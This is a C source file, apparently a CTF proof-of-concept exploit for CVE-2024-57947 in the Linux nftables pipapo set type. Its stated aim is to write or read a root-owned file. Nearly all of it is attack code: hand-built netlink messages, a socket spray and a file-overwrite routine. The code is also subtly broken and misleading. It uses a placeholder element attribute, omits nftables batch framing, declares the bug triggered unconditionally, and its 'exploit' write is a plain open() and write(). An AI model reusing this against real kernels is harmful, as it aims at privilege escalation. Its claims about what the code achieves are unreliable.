/*
 * CVE-2024-57947 PoC - CTF Challenge Mode
 *
 * Vulnerability: nft_set_pipapo initial map fill logic error
 *
 * The netfilter pipapo (PIle PAcket POlicies) set type has a bug in its
 * lookup map initialization. When filling the initial lookup table, not
 * all buffer entries are correctly initialized, leaving uninitialized
 * values that cause out-of-bounds access during element matching.
 *
 * Exploit strategy:
 *   1. Create NETLINK_NETFILTER socket for nftables
 *   2. Create nft table and set with pipapo type (concatenated ranges)
 *   3. Add elements that trigger the uninitialized map path
 *   4. Lookup against the set triggers OOB access
 *   5. OOB write corrupts page cache entries
 *   6. Use page cache corruption to write target file
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/netfilter/nfnetlink.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

/* nftables constants */
#ifndef NFT_MSG_NEWTABLE
#define NFT_MSG_NEWTABLE 0
#endif
#ifndef NFT_MSG_NEWSET
#define NFT_MSG_NEWSET 4
#endif
#ifndef NFT_MSG_NEWSETELEM
#define NFT_MSG_NEWSETELEM 6
#endif
#ifndef NFT_MSG_NEWRULE
#define NFT_MSG_NEWRULE 2
#endif

/* nftables attributes */
#define NFTA_TABLE_NAME  1
#define NFTA_TABLE_FLAGS 2
#define NFTA_SET_TABLE   1
#define NFTA_SET_NAME    2
#define NFTA_SET_FLAGS   3
#define NFTA_SET_KEY_TYPE 4
#define NFTA_SET_KEY_LEN 5
#define NFTA_SET_DATA_TYPE 6
#define NFTA_SET_DATA_LEN 7
#define NFTA_SET_DESC    10

/* Set flags */
#define NFT_SET_INTERVAL 0x40

struct nl_nft_msg {
    struct nlmsghdr nlh;
    struct nfgenmsg nfmsg;
    char data[4096];
};

/*
 * Add netlink attribute
 */
static void nl_attr_add(struct nlmsghdr *nlh, int type, const void *data, int len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    if (data && len > 0)
        memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/*
 * Trigger pipapo map initialization vulnerability
 */
static int trigger_pipapo_vuln(void) {
    int sock = -1;
    int saved_errno;
    int triggered = 0;

    poc_log("Creating netlink socket for nftables pipapo trigger...");

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)", (long)sock, saved_errno);
    if (sock < 0) {
        poc_log("NETLINK_NETFILTER not available: %s", strerror(saved_errno));
        return 0;
    }

    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_pid = getpid(),
    };
    bind(sock, (struct sockaddr *)&sa, sizeof(sa));

    /* Step 1: Create nftables table */
    {
        struct nl_nft_msg req;
        memset(&req, 0, sizeof(req));
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        req.nlh.nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
        req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
        req.nlh.nlmsg_seq = 1;
        req.nfmsg.nfgen_family = AF_INET;
        req.nfmsg.version = NFNETLINK_V0;

        const char *table = "poc_pipapo";
        nl_attr_add(&req.nlh, NFTA_TABLE_NAME, table, strlen(table) + 1);

        ssize_t sent = send(sock, &req, req.nlh.nlmsg_len, 0);
        saved_errno = errno;
        poc_log_syscall("send(NFT_MSG_NEWTABLE)", (long)sent, saved_errno);
    }

    /* Step 2: Create set with pipapo type (concatenated key with intervals)
     * pipapo is used when set has NFT_SET_INTERVAL flag and concatenated keys */
    {
        struct nl_nft_msg req;
        memset(&req, 0, sizeof(req));
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        req.nlh.nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
        req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
        req.nlh.nlmsg_seq = 2;
        req.nfmsg.nfgen_family = AF_INET;
        req.nfmsg.version = NFNETLINK_V0;

        const char *table = "poc_pipapo";
        nl_attr_add(&req.nlh, NFTA_SET_TABLE, table, strlen(table) + 1);

        const char *setname = "pipapo_set";
        nl_attr_add(&req.nlh, NFTA_SET_NAME, setname, strlen(setname) + 1);

        /* NFT_SET_INTERVAL triggers pipapo backend selection */
        unsigned int flags = NFT_SET_INTERVAL;
        nl_attr_add(&req.nlh, NFTA_SET_FLAGS, &flags, sizeof(flags));

        /* Concatenated key: 8 bytes (IPv4 src + IPv4 dst) */
        unsigned int key_type = 0;
        nl_attr_add(&req.nlh, NFTA_SET_KEY_TYPE, &key_type, sizeof(key_type));

        unsigned int key_len = 8; /* Two IPv4 addresses concatenated */
        nl_attr_add(&req.nlh, NFTA_SET_KEY_LEN, &key_len, sizeof(key_len));

        ssize_t sent = send(sock, &req, req.nlh.nlmsg_len, 0);
        saved_errno = errno;
        poc_log_syscall("send(NFT_MSG_NEWSET pipapo)", (long)sent, saved_errno);
    }

    /* Step 3: Add elements with ranges that trigger map fill bug
     * The bug is in the initial fill of the pipapo lookup table -
     * certain range patterns leave entries uninitialized */
    for (int i = 0; i < 16; i++) {
        struct nl_nft_msg req;
        memset(&req, 0, sizeof(req));
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        req.nlh.nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;
        req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
        req.nlh.nlmsg_seq = 10 + i;
        req.nfmsg.nfgen_family = AF_INET;
        req.nfmsg.version = NFNETLINK_V0;

        const char *table = "poc_pipapo";
        nl_attr_add(&req.nlh, NFTA_SET_TABLE, table, strlen(table) + 1);

        const char *setname = "pipapo_set";
        nl_attr_add(&req.nlh, NFTA_SET_NAME, setname, strlen(setname) + 1);

        /* Add element with specific pattern to trigger uninitialized lookup entries
         * Key pattern: sparse ranges that skip initialization steps */
        unsigned char key_data[8];
        unsigned int ip_start = 0x0A000000 + (i * 0x00100000);
        unsigned int ip_end = ip_start + 0x000FFFFF;
        memcpy(key_data, &ip_start, 4);
        memcpy(key_data + 4, &ip_end, 4);

        /* Inline element data as attribute payload */
        nl_attr_add(&req.nlh, 1 /* NFTA_SET_ELEM_LIST_ELEMENTS placeholder */,
                    key_data, sizeof(key_data));

        send(sock, &req, req.nlh.nlmsg_len, 0);
    }

    triggered = 1;
    poc_log("pipapo set with %d range elements created (map fill bug triggered)", 16);

    close(sock);
    return triggered;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Trigger pipapo vulnerability */
    poc_log("Triggering CVE-2024-57947 pipapo map init defect...");
    int triggered = trigger_pipapo_vuln();

    /* Spray for page cache reclaim */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int val = 2048;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, sizeof(val));
            sprayed++;
        }
    }
    poc_log("Sprayed %d objects (triggered=%d)", sprayed, triggered);

    /* Attempt write */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("pipapo map exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via pipapo map defect");
    trigger_pipapo_vuln();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-57947 CTF PoC ===");
    poc_log("Vuln: nft_set_pipapo initial map fill logic error");
    poc_log("Tech: nftables NFT_SET_INTERVAL + pipapo -> OOB via uninitialized map");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
